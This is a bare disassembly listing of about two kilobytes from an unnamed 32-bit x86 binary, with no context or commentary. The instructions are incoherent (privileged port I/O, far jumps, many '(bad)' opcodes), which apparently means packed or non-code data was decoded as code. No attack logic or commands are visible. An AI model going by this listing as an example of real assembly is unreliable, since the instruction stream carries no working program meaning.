  405133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405134:	icebp  
  405135:	pop    esp
  405136:	jae    0x4050db
  405138:	daa    
  405139:	scas   al,BYTE PTR es:[edi]
  40513a:	loopne 0x4051b3
  40513c:	sahf   
  40513d:	les    esp,FWORD PTR [ecx+esi*1]
  405140:	cmova  edx,DWORD PTR [ecx+edx*4+0x564c3afb]
  405148:	push   0x1f
  40514a:	mov    ebx,0x515907ca
  40514f:	sub    BYTE PTR [eax+0x186ad8b2],dh
  405155:	das    
  405156:	jmp    0x24b1:0xc416f75f
  40515d:	and    DWORD PTR [edx],esp
  40515f:	and    dh,dl
  405161:	shl    BYTE PTR [ebx],1
  405163:	aad    0xa0
  405165:	xchg   edx,eax
  405166:	in     eax,dx
  405167:	int    0xab
  405169:	adc    dl,BYTE PTR [ebp-0x6e15c2bb]
  40516f:	dec    ebp
  405170:	push   0xf7d45c95
  405175:	test   bh,ah
  405177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405178:	fs xchg esi,eax
  40517a:	das    
  40517b:	jne    0x40511c
  40517d:	mov    esi,0xace4d095
  405182:	addr16 and bh,ch
  405185:	dec    BYTE PTR [ebp-0x13]
  405188:	xor    DWORD PTR [esi],edx
  40518a:	dec    ebp
  40518b:	iret   
  40518c:	pop    ebx
  40518d:	dec    ecx
  40518e:	xchg   ebx,eax
  40518f:	push   edx
  405190:	in     eax,0x7
  405192:	imul   ebx,DWORD PTR [edi],0x5d
  405195:	pop    esi
  405196:	sbb    cl,BYTE PTR [edx+eax*4+0x7b]
  40519a:	sbb    al,0x2e
  40519c:	sbb    al,0x9b
  40519e:	imul   ecx,DWORD PTR gs:[ecx],0xbf89cc38
  4051a5:	adc    al,0xf
  4051a7:	idiv   BYTE PTR [ecx]
  4051a9:	add    BYTE PTR ds:0xd40f2c41,0x91
  4051b0:	mov    ebx,0x194529a6
  4051b5:	ss aam 0xfa
  4051b8:	test   al,0x30
  4051ba:	xchg   esi,eax
  4051bb:	cmp    esp,DWORD PTR [edi]
  4051bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051be:	xor    bh,BYTE PTR [edi]
  4051c0:	push   edx
  4051c1:	data16 sahf 
  4051c3:	cmp    BYTE PTR [ecx+0x4b2d435b],dh
  4051c9:	mov    ds:0xe42dc04d,al
  4051ce:	sub    al,0xd6
  4051d0:	cmp    cl,cl
  4051d2:	sbb    eax,0x5f3b2979
  4051d7:	xor    BYTE PTR [ecx],al
  4051d9:	jecxz  0x4051c5
  4051db:	and    dh,bh
  4051dd:	add    al,0xd3
  4051df:	fs in  eax,dx
  4051e1:	cmp    al,0x19
  4051e3:	sbb    eax,0xdca4128e
  4051e8:	les    edi,FWORD PTR [eax]
  4051ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051eb:	mov    eax,0x41e5e9ee
  4051f0:	ret    0x29f9
  4051f3:	cmp    DWORD PTR [esi-0x256094cb],edi
  4051f9:	sbb    DWORD PTR [ecx],ebp
  4051fb:	lock dec esi
  4051fd:	pop    ebp
  4051fe:	imul   ecx,esp,0x7a191310
  405204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405205:	jp     0x4051d5
  405207:	pop    ds
  405208:	xchg   ebx,eax
  405209:	push   ds
  40520a:	adc    DWORD PTR [ecx],edi
  40520c:	ds stos DWORD PTR es:[edi],eax
  40520e:	iret   
  40520f:	sub    al,0xf1
  405211:	(bad)  
  405212:	inc    eax
  405213:	(bad)  
  405214:	sub    al,0x90
  405216:	mov    esp,0xa7447d5b
  40521b:	adc    al,0xdc
  40521d:	push   edx
  40521e:	cwde   
  40521f:	mov    cl,0xc9
  405221:	inc    ebx
  405222:	and    BYTE PTR [eax],dl
  405224:	inc    esp
  405225:	loopne 0x40525e
  405227:	xor    eax,0x9d1805b0
  40522c:	aaa    
  40522d:	jl     0x4051bd
  40522f:	jnp    0x405253
  405231:	ds out 0x44,eax
  405234:	lock mov ds,WORD PTR [edx-0x3a]
  405238:	xor    eax,0x62094ffe
  40523d:	push   edi
  40523e:	cmc    
  40523f:	push   edi
  405240:	mov    bl,0xff
  405242:	inc    esp
  405243:	jno    0x4051d3
  405245:	xchg   ecx,eax
  405246:	repnz les eax,FWORD PTR [edi]
  405249:	aas    
  40524a:	or     bl,BYTE PTR [edi+0x3995b208]
  405250:	jns    0x405252
  405252:	lods   eax,DWORD PTR ds:[esi]
  405253:	nop
  405254:	and    DWORD PTR [edi+0x739afd1a],ebp
  40525a:	inc    eax
  40525b:	retf   0xd61d
  40525e:	cmp    DWORD PTR [ecx],ebx
  405260:	dec    edi
  405261:	sub    BYTE PTR [esi-0x5f],0x15
  405265:	and    cl,ah
  405267:	dec    esp
  405268:	inc    edx
  405269:	adc    DWORD PTR [edi+0x6151932d],edx
  40526f:	pusha  
  405270:	nop
  405271:	retf   
  405272:	lock out 0x57,eax
  405275:	jo     0x4051f8
  405277:	repz cdq 
  405279:	leave  
  40527a:	out    dx,eax
  40527b:	imul   esi,DWORD PTR [edi],0xc682eb7b
  405281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405282:	and    al,0x80
  405284:	bound  ecx,QWORD PTR [esi]
  405286:	jle    0x4052d2
  405288:	dec    edx
  405289:	in     al,0xcd
  40528b:	arpl   WORD PTR [ecx+ecx*4+0x66f4d0dd],sp
  405292:	(bad)  
  405293:	shl    DWORD PTR [eax],1
  405295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405296:	nop
  405297:	loope  0x4052f9
  405299:	xchg   ebx,eax
  40529a:	cli    
  40529b:	xlat   BYTE PTR ds:[ebx]
  40529c:	scas   al,BYTE PTR es:[edi]
  40529d:	xchg   edx,eax
  40529e:	hlt    
  40529f:	pop    es
  4052a0:	add    bh,BYTE PTR [eax]
  4052a2:	mov    ch,0x57
  4052a4:	mov    ds:0x2536dbef,eax
  4052a9:	inc    ecx
  4052aa:	fcmovb st,st(7)
  4052ac:	test   al,0xf0
  4052ae:	out    0xbb,eax
  4052b0:	stc    
  4052b1:	hlt    
  4052b2:	loopne 0x405307
  4052b4:	xchg   DWORD PTR [eax],esp
  4052b6:	pop    ss
  4052b7:	push   edx
  4052b8:	out    0xad,al
  4052ba:	in     al,0x90
  4052bc:	or     ebp,DWORD PTR [esi+edi*4-0x2c]
  4052c0:	mov    ah,al
  4052c2:	inc    edi
  4052c3:	fstp   DWORD PTR [esi]
  4052c5:	pop    edx
  4052c6:	xor    al,0x91
  4052c8:	addr16 push 0x25b140e2
  4052ce:	jg     0x405297
  4052d0:	sub    eax,0x34cbf00d
  4052d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052d6:	fs mov ch,0x82
  4052d9:	stc    
  4052da:	xor    al,0x3e
  4052dc:	ror    bh,0x78
  4052df:	and    dl,BYTE PTR [esi+0x2f]
  4052e2:	jmp    0x944eabe0
  4052e7:	sbb    bh,BYTE PTR [esi+0x44]
  4052ea:	adc    BYTE PTR [ebp+0x41],0xf1
  4052ee:	xchg   edi,eax
  4052ef:	sbb    eax,0xf0f1386e
  4052f4:	imul   edi,eax,0x9f38dc13
  4052fa:	push   eax
  4052fb:	test   DWORD PTR ss:[edx-0x78],0x10d7388f
  405303:	out    0x11,eax
  405305:	inc    esi
  405306:	rcr    BYTE PTR [edx-0x56],1
  405309:	arpl   WORD PTR [edi-0x618fe9bc],ax
  40530f:	rcl    ah,0xaf
  405312:	loopne 0x4052c5
  405314:	cmp    BYTE PTR ss:[edx],0xd3
  405318:	jns    0x4052fc
  40531a:	aad    0x8c
  40531c:	adc    bh,BYTE PTR [eax+0xa4dda4f]
  405322:	push   ecx
  405323:	cmp    al,0xcf
  405325:	popa   
  405326:	in     eax,0x68
  405328:	sbb    DWORD PTR [ecx-0x6b797f01],ebx
  40532e:	fnstcw WORD PTR [ebx]
  405330:	cmp    al,0x52
  405332:	jo     0x4052d1
  405334:	mov    ch,0x81
  405336:	mov    ds:0x85d52fef,eax
  40533b:	add    ebp,DWORD PTR ds:0x86e6c38c
  405341:	ins    DWORD PTR es:[edi],dx
  405342:	(bad)  
  405343:	xchg   edx,ebx
  405345:	int3   
  405346:	cs mov cl,0xf7
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	in     eax,0x23
  40534c:	movlps QWORD PTR [ebp-0x1b],xmm2
  405350:	out    dx,eax
  405351:	nop
  405352:	mov    ah,0xc0
  405354:	adc    al,0xc3
  405356:	imul   edx,ecx,0x64
  405359:	icebp  
  40535a:	pusha  
  40535b:	popa   
  40535c:	dec    ebp
  40535d:	adc    dl,BYTE PTR [eax]
  40535f:	retf   0xe14d
  405362:	pushf  
  405363:	repnz add al,ch
  405366:	call   0x80b4c383
  40536b:	xchg   esp,eax
  40536c:	cmp    DWORD PTR [ebx],ebx
  40536e:	inc    edi
  40536f:	push   edi
  405370:	jg     0x4053d7
  405372:	xchg   esp,eax
  405373:	iret   
  405374:	aaa    
  405375:	pop    eax
  405376:	in     eax,0x27
  405378:	pop    eax
  405379:	data16 add al,0xd2
  40537c:	push   edx
  40537d:	sub    edi,0x42
  405380:	gs mov esp,0xd25589b0
  405386:	mov    eax,ds:0xded0f851
  40538b:	pop    ebp
  40538c:	inc    esp
  40538d:	jno    0x405387
  40538f:	mov    BYTE PTR [eax+0x3],cl
  405392:	mov    ds:0x675cabbf,eax
  405397:	lds    esi,FWORD PTR [edi]
  405399:	push   ebp
  40539a:	jbe    0x40533f
  40539c:	jg     0x405327
  40539e:	test   DWORD PTR [ebx+0xc],esi
  4053a1:	and    al,0xd0
  4053a3:	pop    eax
  4053a4:	cli    
  4053a5:	ins    BYTE PTR es:[edi],dx
  4053a6:	sbb    al,0xc5
  4053a8:	and    esi,ebp
  4053aa:	jno    0x4053de
  4053ac:	push   ss
  4053ad:	fstp   QWORD PTR [esi+0x5a79d362]
  4053b3:	(bad)  
  4053b5:	push   ebx
  4053b6:	jno    0x405339
  4053b8:	inc    edx
  4053b9:	lahf   
  4053ba:	int3   
  4053bb:	sar    edx,0xf3
  4053be:	daa    
  4053bf:	mov    ss,WORD PTR [edi+edi*2-0x35fccac1]
  4053c6:	stos   DWORD PTR es:[edi],eax
  4053c7:	add    BYTE PTR [ebx-0x57],ch
  4053ca:	xchg   bh,ah
  4053cc:	lods   al,BYTE PTR ds:[esi]
  4053cd:	mov    ds:0xd8f4640d,eax
  4053d2:	repz pop es
  4053d4:	push   esp
  4053d5:	add    ebp,esi
  4053d7:	xchg   esi,eax
  4053d8:	sub    eax,0x942f208d
  4053dd:	lods   al,BYTE PTR ds:[esi]
  4053de:	jge    0x405457
  4053e0:	mov    ch,0xaa
  4053e2:	mov    es,WORD PTR [edi-0x3a7ceb26]
  4053e8:	loopne 0x405401
  4053ea:	dec    esi
  4053eb:	or     eax,0xa39c08a1
  4053f0:	or     eax,0xbe9151ed
  4053f5:	cli    
  4053f6:	push   edi
  4053f7:	adc    DWORD PTR [ecx-0x59eba216],eax
  4053fd:	lds    esp,FWORD PTR [edi-0x57f0bfb7]
  405403:	inc    edi
  405404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405405:	int3   
  405406:	das    
  405407:	ret    
  405408:	or     DWORD PTR [ecx+0x412fdd50],ebx
  40540e:	push   ebp
  40540f:	fild   DWORD PTR [edi+0x7944dce]
  405415:	or     dh,BYTE PTR [edi]
  405417:	jbe    0x4053c6
  405419:	inc    ebx
  40541a:	(bad)  
  40541b:	sub    DWORD PTR [ebp-0x17a9d6a9],esi
  405421:	xchg   edx,eax
  405422:	or     bl,BYTE PTR [ebx-0x39eb7103]
  405428:	outs   dx,BYTE PTR ds:[esi]
  405429:	fisub  WORD PTR [ecx-0x2a8f138e]
  40542f:	fbstp  TBYTE PTR [esi-0x20]
  405432:	aad    0x42
  405434:	out    0x4a,al
  405436:	cmp    ecx,DWORD PTR [ebx-0x7b]
  405439:	sub    DWORD PTR [ecx],ecx
  40543b:	sub    ch,BYTE PTR [edi-0xb]
  40543e:	cmp    DWORD PTR [eax+eax*8],ebp
  405441:	xor    DWORD PTR ds:0x6b2ff8ac,edx
  405447:	sar    BYTE PTR [ebx-0x121ca2e5],0xdc
  40544e:	ds push edi
  405450:	in     al,dx
  405451:	stc    
  405452:	jecxz  0x405427
  405454:	mov    ch,0x47
  405456:	mov    ecx,0xfa73364f
  40545b:	lods   al,BYTE PTR ds:[esi]
  40545c:	jbe    0x40548f
  40545e:	jle    0x405463
  405460:	std    
  405461:	mov    ebx,0x33d63ce8
  405466:	in     eax,0x58
  405468:	rol    DWORD PTR [ebx-0x4a],1
  40546b:	and    BYTE PTR [ebp-0x206a2ffb],bh
  405471:	xchg   ecx,eax
  405472:	jno    0x405459
  405474:	les    ebp,FWORD PTR [ebx-0x3689a7d3]
  40547a:	fistp  WORD PTR [ebp+0x30]
  40547d:	shl    BYTE PTR [edi-0xb25a0ad],0x30
  405484:	rcl    ebx,0x56
  405487:	(bad)  
  405488:	aad    0x5e
  40548a:	cmp    edx,DWORD PTR [edi+0x29]
  40548d:	jb     0x4054c7
  40548f:	in     eax,0x26
  405491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405492:	test   al,0x72
  405494:	ins    BYTE PTR es:[edi],dx
  405495:	xor    BYTE PTR [ecx+0x4a493032],dl
  40549b:	inc    edi
  40549c:	scas   al,BYTE PTR es:[edi]
  40549d:	neg    DWORD PTR [edx]
  40549f:	cmp    BYTE PTR [edx],0x2d
  4054a2:	mov    ebx,DWORD PTR [ebx+0x16]
  4054a5:	add    al,0x1a
  4054a7:	mov    WORD PTR [esi-0x2e],gs
  4054aa:	nop
  4054ab:	or     edx,DWORD PTR ds:0x240fd763
  4054b1:	pop    edi
  4054b2:	pop    esp
  4054b3:	pop    eax
  4054b4:	imul   edi,ecx,0xd1f5968f
  4054ba:	add    DWORD PTR [esi-0x11],0x44c1e9e9
  4054c1:	dec    edx
  4054c2:	rcl    BYTE PTR ds:[ebp*8+0x62daaef9],1
  4054ca:	pop    ecx
  4054cb:	ror    BYTE PTR [edx+0x28],1
  4054ce:	sub    esi,ebx
  4054d0:	fcom   QWORD PTR ds:0x41207b1
  4054d6:	in     al,0x7a
  4054d8:	sbb    DWORD PTR [ebp-0x5e],ebp
  4054db:	mov    DWORD PTR [ebx],ecx
  4054dd:	out    0x5d,al
  4054df:	clc    
  4054e0:	add    al,0x90
  4054e2:	sbb    al,0xad
  4054e4:	out    0x5e,eax
  4054e6:	shl    ch,1
  4054e8:	mov    ch,0x64
  4054ea:	out    dx,al
  4054eb:	lahf   
  4054ec:	pop    esp
  4054ed:	and    eax,0x65599cba
  4054f2:	jno    0x405480
  4054f4:	sub    eax,0x580684f5
  4054f9:	rcr    DWORD PTR [edx+0x58fd8ac2],cl
  4054ff:	dec    ebp
  405500:	retf   
  405501:	dec    eax
  405502:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405504:	mov    edx,0x3fdd19c5
  405509:	sub    DWORD PTR [ebx+0x79b54d4],0xea10e4d8
  405513:	jno    0x405503
  405515:	jns    0x4054f1
  405517:	(bad)  
  405518:	gs cdq 
  40551a:	or     al,0x53
  40551c:	pop    bx
  40551e:	sub    eax,0x17cab88
  405523:	xor    BYTE PTR [ebp+0x695b8f47],0x2c
  40552a:	sub    eax,DWORD PTR [edi-0x75]
  40552d:	jle    0x405544
  40552f:	or     ebp,0x15
  405532:	rcr    DWORD PTR [ecx-0x36],cl
  405535:	xchg   DWORD PTR [edi+0x56],edx
  405538:	dec    esi
  405539:	loop   0x40553f
  40553b:	adc    edx,DWORD PTR [esi-0x7b]
  40553e:	cmp    DWORD PTR [ebp-0x5b],edx
  405541:	mov    edx,0xfd3593bc
  405546:	ins    BYTE PTR es:[edi],dx
  405547:	in     eax,0x2c
  405549:	aam    0x1a
  40554b:	es jnp 0x405542
  40554e:	fnstenv [ecx+0x677059e8]
  405554:	icebp  
  405555:	jmp    0x405543
  405557:	adc    eax,0xfcbe1177
  40555c:	popa   
  40555d:	(bad)  
  40555e:	pushf  
  40555f:	sub    eax,0xff3882a9
  405564:	add    ecx,esi
  405566:	mov    esi,0x805c5bbd
  40556b:	xchg   ebp,eax
  40556c:	pop    edi
  40556d:	int    0x9a
  40556f:	adc    edx,DWORD PTR [ecx*8-0x7963556d]
  405576:	in     al,dx
  405577:	call   0xcd2b:0x57bb3822
  40557e:	inc    esi
  40557f:	mov    ecx,0xdb01df8b
  405584:	arpl   WORD PTR [eax+0x7506a312],bp
  40558a:	ds mov ah,0xd6
  40558d:	cmp    BYTE PTR [ecx],al
  40558f:	fcomp  st(1)
  405591:	xchg   ebx,eax
  405592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405593:	sar    BYTE PTR [ebp+0x19dbcba0],0xcc
  40559a:	push   eax
  40559b:	inc    eax
  40559c:	das    
  40559d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40559e:	and    bl,dh
  4055a0:	pop    es
  4055a1:	(bad)  
  4055a2:	push   ecx
  4055a3:	pop    ebx
  4055a4:	fnstsw WORD PTR [edx+0x7d]
  4055a7:	je     0x4055d7
  4055a9:	push   eax
  4055aa:	mov    esp,0xa707d2d8
  4055af:	sub    DWORD PTR [edx],0x5cb29ddd
  4055b5:	in     eax,dx
  4055b6:	or     DWORD PTR [edi+ebx*2+0xa46e6f8],esi
  4055bd:	ret    
  4055be:	(bad)  [esi]
  4055c0:	fnstcw WORD PTR [ebx]
  4055c2:	sub    ebx,DWORD PTR [ecx+eax*4-0x1e]
  4055c6:	lock cmp BYTE PTR [edx+0x7c],al
  4055ca:	mov    ebx,0x6546d452
  4055cf:	fsub   QWORD PTR [edx]
  4055d1:	inc    esi
  4055d2:	ret    
  4055d3:	or     esi,DWORD PTR [ecx]
  4055d5:	adc    bl,dl
  4055d7:	mov    esp,0x3e8e65dd
  4055dc:	pop    es
  4055dd:	outs   dx,DWORD PTR ds:[esi]
  4055de:	aad    0x14
  4055e0:	pop    es
  4055e1:	pushf  
  4055e2:	dec    esp
  4055e3:	pop    eax
  4055e4:	imul   DWORD PTR ds:0x9c1f7d3e
  4055ea:	popa   
  4055eb:	or     eax,0xe785bc14
  4055f0:	sub    BYTE PTR [ebx-0x58],bh
  4055f3:	xor    DWORD PTR [ebx-0x2],ebx
  4055f6:	repz inc esi
  4055f8:	xor    eax,0xda285c8d
  4055fd:	adc    al,0x4c
  4055ff:	mov    gs,WORD PTR gs:[edi-0x58f7dfbe]
  405606:	rcr    BYTE PTR [esi+0x7e],0x56
  40560a:	out    dx,al
  40560b:	mov    edi,0xdcd4d3a6
  405610:	inc    ecx
  405611:	cmp    eax,0xb89a7265
  405616:	bound  eax,QWORD PTR [ecx]
  405618:	repz xchg edi,eax
  40561a:	and    DWORD PTR [edi],0xffffffa5
  40561d:	mov    ebx,0x1e015619
  405622:	jb     0x40567d
  405624:	adc    BYTE PTR [eax],ah
  405626:	sub    cl,BYTE PTR [edi-0x29]
  405629:	push   ss
  40562a:	neg    esp
  40562c:	ret    0xac70
  40562f:	and    dl,BYTE PTR [ebx+0x78277e9a]
  405635:	cmp    eax,0xbf53377a
  40563a:	in     al,0xb4
  40563c:	jnp    0x405658
  40563e:	pop    esp
  40563f:	nop
  405640:	retf   0xfc71
  405643:	cmc    
  405644:	ror    BYTE PTR [edx+0x5745fc98],1
  40564a:	mov    eax,DWORD PTR ds:0xde3ed798
  405650:	addr16 cmp al,0x4f
  405653:	jbe    0x4055dd
  405655:	mov    ch,dl
  405657:	dec    eax
  405658:	mov    eax,ds:0x8cb36223
  40565d:	sub    ebx,DWORD PTR [edx+0x44]
  405660:	inc    ecx
  405661:	rcr    DWORD PTR [esi+0x3ef64d83],0x2f
  405668:	div    BYTE PTR [ebp-0x68105f0e]
  40566e:	scas   eax,DWORD PTR es:[edi]
  40566f:	in     eax,0x34
  405671:	inc    esp
  405672:	pop    edi
  405673:	ret    
  405674:	sbb    eax,0x848fca09
  405679:	mov    edi,esp
  40567b:	(bad)  
  40567c:	xor    esp,DWORD PTR [ebx-0x36]
  40567f:	scas   eax,DWORD PTR es:[edi]
  405680:	sbb    ebx,ebp
  405682:	and    ebp,DWORD PTR [ebx]
  405684:	mov    ah,0xbe
  405686:	mov    esp,0x8e32eaac
  40568b:	add    al,0xdd
  40568d:	sbb    BYTE PTR [edx+0x4a],dh
  405690:	sbb    al,0xdc
  405692:	mov    edx,0x42c182f0
  405697:	xor    eax,0xf93b4ebb
  40569c:	(bad)  
  40569d:	mov    ch,0xba
  40569f:	push   ebx
  4056a0:	stc    
  4056a1:	sub    dh,ah
  4056a3:	es sahf 
  4056a5:	js     0x4056c0
  4056a7:	in     al,dx
  4056a8:	jmp    0x40562c
  4056aa:	jo     0x4056e0
  4056ac:	sbb    DWORD PTR [ecx+0x6c4092b4],ecx
  4056b2:	test   BYTE PTR [ecx+0x22],cl
  4056b5:	adc    eax,0x9a0ac424
  4056ba:	dec    edx
  4056bb:	xlat   BYTE PTR ds:[ebx]
  4056bc:	fs in  eax,dx
  4056be:	sbb    eax,0xabdddf29
  4056c3:	sbb    BYTE PTR [ebx],ah
  4056c5:	test   al,0x29
  4056c7:	mov    ch,0xc0
  4056c9:	les    edi,FWORD PTR [eax]
  4056cb:	aam    0x7b
  4056cd:	jne    0x405709
  4056cf:	call   0xdc3abd02
  4056d4:	mov    BYTE PTR [esi-0x3533f532],al
  4056da:	xchg   BYTE PTR [ecx],ah
  4056dc:	xchg   ecx,eax
  4056dd:	sub    ch,0x16
  4056e0:	clc    
  4056e1:	or     esp,DWORD PTR [ecx]
  4056e3:	add    eax,0xb33dfb54
  4056e8:	dec    esi
  4056e9:	dec    ebx
  4056ea:	dec    edi
  4056eb:	(bad)  
  4056ec:	xor    al,0xb6
  4056ee:	bswap  bx
  4056f1:	fisttp WORD PTR [edi+ebp*4-0xd]
  4056f5:	scas   eax,DWORD PTR es:[edi]
  4056f6:	jp     0x4056d5
  4056f8:	inc    ebp
  4056f9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056fb:	test   ah,al
  4056fd:	(bad)  
  4056fe:	into   
  4056ff:	pop    ebx
  405700:	xchg   BYTE PTR [esi+0x6a],dh
  405703:	cwde   
  405704:	xor    al,0x89
  405706:	sbb    al,0xe2
  405708:	sub    eax,edi
  40570a:	xor    ebp,ebx
  40570c:	mov    ds:0x9a89a03c,eax
  405711:	int    0x72
  405713:	gs out 0x5c,eax
  405716:	sbb    BYTE PTR [esi],bl
  405718:	mul    esp
  40571a:	ret    0x743e
  40571d:	es xchg edx,eax
  40571f:	imul   DWORD PTR [ebx]
  405721:	sub    dh,BYTE PTR [eax-0x6f]
  405724:	adc    dh,BYTE PTR [ebp+0x7b]
  405727:	adc    ch,bl
  405729:	push   esp
  40572a:	mov    al,0x89
  40572c:	enter  0xaafc,0x7a
  405730:	stc    
  405731:	cmp    al,BYTE PTR [ebx+0x17874da6]
  405737:	fs push edi
  405739:	jp     0x4056f1
  40573b:	jae    0x40573f
  40573d:	sbb    DWORD PTR [edi-0x861023a],ecx
  405743:	and    BYTE PTR [eax],cl
  405745:	stc    
  405746:	push   ds
  405747:	dec    ebx
  405748:	icebp  
  405749:	push   esi
  40574a:	push   ebx
  40574b:	mov    ds:0xb190c163,eax
  405750:	xor    ebp,DWORD PTR [esi-0x1]
  405753:	push   ebp
  405754:	aad    0xcd
  405756:	aad    0xbe
  405758:	and    esi,0xb50ee15e
  40575e:	call   0x987b016b
  405763:	retf   
  405764:	test   eax,0x816e55d
  405769:	fwait
  40576a:	mov    bh,0xfa
  40576c:	hlt    
  40576d:	fs mov dh,0x5a
  405770:	cmc    
  405771:	push   eax
  405772:	push   cs
  405773:	arpl   WORD PTR [ebx],bx
  405775:	nop
  405776:	adc    eax,0x7fa6d50c
  40577b:	add    DWORD PTR [eax+ebp*2+0x34],0x5506504b
  405783:	sbb    BYTE PTR [esi-0x2d],0xad
  405787:	idiv   ecx
  405789:	retf   0xe010
  40578c:	inc    eax
  40578d:	dec    esi
  40578e:	sahf   
  40578f:	mov    eax,0x83942b01
  405794:	mov    cl,0xd
  405796:	xchg   ebx,eax
  405797:	(bad)  
  405798:	jmp    0xad69:0x744773a5
  40579f:	arpl   cx,sp
  4057a1:	or     esp,ebp
  4057a3:	add    DWORD PTR [eax+ebx*2+0x5eba265c],ecx
  4057aa:	(bad)  
  4057ab:	sbb    al,0x66
  4057ad:	fs std 
  4057af:	pop    eax
  4057b0:	test   BYTE PTR [ecx+0x3d],bh
  4057b3:	pop    ecx
  4057b4:	jmp    0x40574b
  4057b6:	pop    esp
  4057b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b8:	mov    ah,0x30
  4057ba:	add    eax,0x35329fb5
  4057bf:	push   esp
  4057c0:	and    BYTE PTR [edi],dl
  4057c2:	ins    DWORD PTR es:[edi],dx
  4057c3:	dec    esi
  4057c4:	sbb    al,0x8b
  4057c6:	sar    DWORD PTR [ebp-0x783b46fc],1
  4057cc:	jbe    0x4057cd
  4057ce:	xchg   edi,eax
  4057cf:	inc    esp
  4057d0:	mov    edx,0x4f5b7703
  4057d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d6:	(bad)  
  4057d7:	sub    dh,0xf
  4057da:	add    DWORD PTR [ebx-0x6857d833],edi
  4057e0:	jbe    0x4057a8
  4057e2:	mov    ds:0xb46829d5,al
  4057e7:	iret   
  4057e8:	xor    al,0x52
  4057ea:	push   ebp
  4057eb:	xchg   ecx,eax
  4057ec:	ret    0x4e1c
  4057ef:	adc    eax,0x991ff2fc
  4057f4:	mov    esi,0xc206a437
  4057f9:	jecxz  0x405809
  4057fb:	out    0xfc,eax
  4057fd:	push   ebp
  4057fe:	dec    edi
  4057ff:	xchg   ebp,eax
  405800:	and    eax,0x653177fa
  405805:	pop    edi
  405806:	mov    BYTE PTR [edi+0x9],cl
  405809:	sub    al,0x5b
  40580b:	mov    cl,BYTE PTR [esi-0x41d508ce]
  405811:	aam    0x17
  405813:	mov    al,0x4e
  405815:	push   0x22
  405817:	adc    eax,DWORD PTR ds:0x4ccaf9b2
  40581d:	out    dx,al
  40581e:	cmp    cl,bl
  405820:	jge    0x405872
  405822:	outs   dx,BYTE PTR ds:[esi]
  405823:	mov    al,ds:0xe6c83d06
  405828:	xchg   ah,bh
  40582a:	div    DWORD PTR [ebx-0x5d]
  40582d:	test   BYTE PTR [edi+0x3beec810],dh
  405833:	les    esi,FWORD PTR [ecx-0x675f1808]
  405839:	rcr    eax,1
  40583b:	add    al,0x11
  40583d:	dec    eax
  40583e:	sub    ebp,DWORD PTR [ecx-0x7e6252a5]
  405844:	push   0xff9579e4
  405849:	jo     0x40581f
  40584b:	xchg   ebx,eax
  40584c:	mov    BYTE PTR [edi],0x98
  40584f:	push   edx
  405850:	dec    edx
  405851:	lea    esi,[eax-0x4baab914]
  405857:	add    BYTE PTR ds:0x985fd59a,ah
  40585d:	mov    ecx,0x89d27828
  405862:	ins    DWORD PTR es:[edi],dx
  405863:	lds    edi,FWORD PTR [ecx]
  405865:	pop    ebp
  405866:	sub    al,0xe2
  405868:	push   ebp
  405869:	push   esi
  40586a:	retf   0x7b10
  40586d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40586e:	pushf  
  40586f:	lea    ebp,[eax-0x4289273e]
  405875:	mov    ds:0xbb25f958,al
  40587a:	jmp    0x40580d
  40587c:	mov    ch,0x95
  40587e:	mov    al,ds:0xce311c97
  405883:	addr16 leave 
  405885:	jecxz  0x4058a8
  405887:	mov    ch,0xf1
  405889:	test   al,0x5e
  40588b:	xor    al,BYTE PTR [ebp-0x71]
  40588e:	sbb    eax,0x30d16466
  405893:	enter  0x2ff8,0xad
  405897:	mov    al,0xec
  405899:	xchg   esi,eax
  40589a:	(bad)  
  40589b:	dec    ebx
  40589c:	pop    edx
  40589d:	outs   dx,DWORD PTR ds:[esi]
  40589e:	inc    ebp
  40589f:	loopne 0x40590c
  4058a1:	jmp    0x4058d5
  4058a3:	dec    cl
  4058a5:	xchg   DWORD PTR [eax+0x24],edx
  4058a8:	push   ss
  4058a9:	push   eax
  4058aa:	test   eax,0x8e777257
  4058af:	add    BYTE PTR [ecx],bl
  4058b1:	and    eax,DWORD PTR [ebx+0x1a]
  4058b4:	call   0xbd8bedd6
  4058b9:	push   ss
  4058ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058bb:	test   eax,0x7eea6ec1
  4058c0:	jne    0x405899
  4058c2:	sbb    BYTE PTR ds:0xc76fe351,ch
  4058c8:	movd   mm1,DWORD PTR [ebp-0x4a0ea67b]
  4058cf:	hlt    
  4058d0:	imul   ebx,edi,0x72
  4058d3:	clc    
  4058d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d5:	cmc    
  4058d6:	test   al,0x56
  4058d8:	cmp    DWORD PTR [edi-0xfee030e],0xffffff95
  4058df:	jp     0x4058f4
  4058e1:	fdiv   st(1),st
  4058e3:	mov    bh,0x26
  4058e5:	(bad)  
  4058e7:	pushf  
  4058e8:	mov    DWORD PTR [edi+ebp*4+0x2f8e11e7],esp
  4058ef:	jno    0x4058bc
  4058f1:	cmp    eax,0x16ba23d1
  4058f6:	sbb    ebp,ecx
  4058f8:	and    BYTE PTR ds:[eax+0x66],0xe6
  4058fd:	xchg   esp,eax
  4058fe:	mov    ebp,0xc17fd5b8
  405903:	mov    BYTE PTR [eax-0x2ff6b687],0x90
  40590a:	cmp    esi,DWORD PTR [ebx]
  40590c:	mul    DWORD PTR ds:0xfe3463ef
  405912:	mov    cl,0xab
